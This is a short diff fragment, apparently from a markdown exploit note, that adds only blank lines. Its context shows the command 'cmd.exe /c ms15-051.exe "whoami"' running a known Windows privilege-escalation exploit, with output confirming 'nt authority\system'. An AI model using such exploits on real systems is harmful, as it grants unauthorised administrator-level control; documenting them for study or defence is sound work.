@@ -29,3 +29,5 @@ cmd.exe /c ms15-051.exe "whoami"
 ==============================
 nt authority\system
 ```
+
+
